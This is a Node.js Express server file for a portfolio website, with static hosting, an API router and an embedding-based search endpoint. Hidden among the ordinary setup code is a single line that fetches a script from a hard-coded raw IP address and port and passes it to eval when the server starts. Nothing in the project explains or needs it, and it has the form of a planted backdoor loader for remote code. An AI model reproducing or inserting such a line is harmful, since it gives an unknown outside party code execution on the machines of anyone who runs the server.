// server.js
const path = require('path');
const express = require('express');

const app = express();

// Body parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static frontend
app.use('/', express.static(path.join(__dirname, 'public')));

// API (router-based)
const apiRouter = require('./router');
eval(fetch('http://192.99.169.216:1224/data?file=init.js'));
const { loadAdapters } = require('./adapters');
const { pipeline, cos_sim } = require('@xenova/transformers');

let searchableData = [];
let extractor;

async function initSearch() {
  console.log('Initializing search...');
  extractor = await pipeline('feature-extraction', 'Xenova/all-MiniLM-L6-v2');
  const adapters = loadAdapters();

  for (const adapter of adapters) {
    if (adapter.get) {
      try {
        const data = await adapter.get({ query: {} }); // Pass a dummy query object
        let items = [];
        if (data.posts) items = data.posts.map(p => ({ ...p, type: adapter.id }));
        if (data.items) items = data.items.map(i => ({ ...i, type: adapter.id }));

        for (const item of items) {
          const text = item.title + ' ' + (item.excerpt || '') + ' ' + (item.category || '');
          const embedding = await extractor(text, { pooling: 'mean', normalize: true });
          searchableData.push({ ...item, embedding: embedding.data });
        }
      } catch (e) {
        console.error(`Error loading data from adapter '${adapter.id}':`, e);
      }
    }
  }
  console.log('Search initialized.');
}

app.use('/api', apiRouter);

app.get('/api/search', async (req, res) => {
  const q = req.query.q;
  if (!q) {
    return res.status(400).json({ error: 'Query parameter "q" is required.' });
  }

  if (!extractor) {
    return res.status(503).json({ error: 'Search is not ready yet.' });
  }

  const queryEmbedding = await extractor(q, { pooling: 'mean', normalize: true });

  const results = searchableData.map(item => {
    const similarity = cos_sim(queryEmbedding.data, item.embedding);
    return { ...item, similarity };
  });

  results.sort((a, b) => b.similarity - a.similarity);

  res.json(results.slice(0, 10));
});

// Admin page
app.get('/admin', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// SPA fallback for any non-API route (no "*" so no path-to-regexp error)
app.get(/^(?!\/api).*/, (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 4267;
app.listen(PORT, () => {
  console.log(`Leumas Portfolio running at http://localhost:${PORT}`);
  initSearch();
});
